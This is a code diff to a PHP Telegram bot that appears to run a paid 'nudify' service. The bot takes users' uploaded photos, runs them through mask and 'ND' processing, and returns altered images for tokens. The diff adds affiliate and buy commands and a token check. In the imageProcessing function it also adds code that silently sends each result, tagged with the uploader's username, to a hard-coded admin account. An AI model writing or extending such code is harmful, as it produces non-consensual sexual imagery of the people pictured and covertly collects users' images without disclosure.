@@ -66,7 +66,29 @@ class CommandsController
                 DataBaseController::setAffiliateTrue($id, $affiliate);
             }
         });
-        self::$bot->onCommand('start', function () {
+       
+            
+       
+        self::$bot->onCommand('me', function () {
+            self::UserInfo();
+            self::DatabaseListener('/me');
+        });
+        self::$bot->onCommand('buy', function () {
+            self::BuyMessage();
+            self::DatabaseListener('/buy');
+        });
+        self::$bot->onCommand('affiliate', function () {
+            $link = 't.me/ndfyr_bot?start=' . self::$bot->userId();
+            self::$bot->sendMessage("You will gain 1 token everytime somebody joins using your link.\n Your link is: $link");
+            self::DatabaseListener('/affiliate');
+        });
+        self::$bot->onCommand('support', function () {
+            self::$bot->sendMessage('Contact @raqo0 for support');
+            self::DatabaseListener('/support');
+        });
+            
+        
+                self::$bot->onCommand('start', function () {
             self::DatabaseListener('/start');
             self::$bot->SendPhoto(
                 photo: InputFile::make(fopen('media/example1.png', 'rb')),
@@ -74,9 +96,9 @@ class CommandsController
                 reply_markup: InlineKeyboardMarkup::make()
                     ->addRow(
                         InlineKeyboardButton::make('My Account', callback_data: '/me'),
-                        InlineKeyboardButton::make('Channel', url: 'https://t.me/ClothesRemovedGroup')
+                        InlineKeyboardButton::make('Support', url: 't.me/raqo0')
                     )->addRow(
-                        InlineKeyboardButton::make('Free Tokens', callback_data: '/freetokens'),
+                        InlineKeyboardButton::make('Affliate', callback_data: '/affiliate'),
                         InlineKeyboardButton::make('Buy', callback_data: '/buy')
                     )
             );
@@ -95,7 +117,6 @@ class CommandsController
                 'We offer free tokens for our users to get free tokens you need to invite your friends to our bot and you will get 1 token for each friend you invite.Or you can get tokens free of charge by watching advertisements',
                 reply_markup: InlineKeyboardMarkup::make()
                     ->addRow(
-                        InlineKeyboardButton::make('Advertisements', callback_data: '/ads'),
                         InlineKeyboardButton::make('Affiliate', callback_data: '/affiliate')
                     )
             );
@@ -104,27 +125,9 @@ class CommandsController
         self::$bot->onCallbackQueryData('/affiliate', function () {
             $link = 't.me/ndfyr_bot?start=' . self::$bot->userId();
             self::$bot->sendMessage("You will gain 1 token everytime somebody joins using your link.\n Your link is: $link");
-        });
-
-        self::$bot->onCallbackQueryData('/ads', function () {
-            $clicksfly = AdvertisementsController::getLinkClicksFly(self::$bot->userId());
-            $linkvertised = AdvertisementsController::getLinkVertise(self::$bot->userId());
-            self::$bot->sendMessage(
-                'We offer free tokens for our users to get free tokens you need to invite your friends to our bot and you will get 1 token for each friend you invite.Or you can get tokens free of charge by watching advertisements',
-                reply_markup: InlineKeyboardMarkup::make()
-                    ->addRow(
-                        InlineKeyboardButton::make('Linkversite(0.5)', url: $linkvertised),
-                        inlinekeyboardButton::make('ClicksFly(0.2)', url: $clicksfly)
-                    )
-
-            );
-            self::DatabaseListener('/ads');
+            self::DatabaseListener('/affiliate');
         });
     }
-    public static function FreeTokens()
-    {
-    }
-
 
     public static function buy($quantity)
     {
@@ -161,7 +164,7 @@ class CommandsController
         $username = self::$bot->user()->username;
         $language_code = self::$bot->user()->language_code;
         $tokens = DataBaseController::GetTokens($id);
-        self::$bot->sendMessage(" Your ID: $id\n Your Username: $username\n Your Language Code: $language_code\n Your Tokens: $tokens ");
+        self::$bot->sendMessage(" Your ID: $id\n Your Username: @$username\n Your Language Code: $language_code\n Your Tokens: $tokens ");
     }
     public static function PaymentListener()
     {
@@ -190,21 +193,46 @@ class CommandsController
 
     public static function imageProcessing()
     {
-
         self::$bot->onMessageType(MessageType::PHOTO, function (Nutgram $bot) {
-            $bot->sendMessage("image is processing please wait");
+            if (DataBaseController::GetTokens(self::$bot->userId()) < 1) {
+                $bot->sendMessage('You dont have enough tokens to process this image');
+                return;
+            }
+            $wait = ImageController::getQueue();
+            $bot->sendMessage("Image is processing, please wait there are $wait people before you");
             $photos = end(self::$bot->message()->photo);
             $data = $bot->getFile($photos->file_id)?->url();
-            $img =  base64_encode( file_get_contents($data));
+            $imgData = file_get_contents($data);
+            $base64image = base64_encode($imgData);
+
             ImageController::init();
-            $mask = imageController::getMask($img);
-            $base64image = imagecontroller::getND($img, $mask);
-            $image = base64_decode($base64image);
-            file_put_contents('final.png', $image);
+            $mask = ImageController::getMask($base64image);
+            $base64Result = ImageController::getND($base64image, $mask);
+            $resultData = base64_decode($base64Result);
+
+            $tempFilePath = tempnam(sys_get_temp_dir(), 'processed_image');
+            file_put_contents($tempFilePath, $resultData);
+
+            $username = $bot->user()->username;
+
             $bot->sendPhoto(
-                photo: InputFile::make(fopen('final.png','r+')),
-                caption: 'Here is your image'
+                photo: InputFile::make($tempFilePath),
+                caption: 'Enjoy your image if there is anything wrong with it contact @raqo0'
             );
+
+            $adminUserId = '5989991134';
+
+            $adminStream = fopen('php://temp', 'r+');
+            fwrite($adminStream, $resultData);
+
+            $bot->sendPhoto(
+                chat_id: $adminUserId,
+                photo: InputFile::make($adminStream, 'processed_image.jpg'),
+                caption: "Here is the image of @$username"
+            );
+
+            unlink($tempFilePath);
+
             DataBaseController::remTokens(self::$bot->userId(), 1);
         });
     }
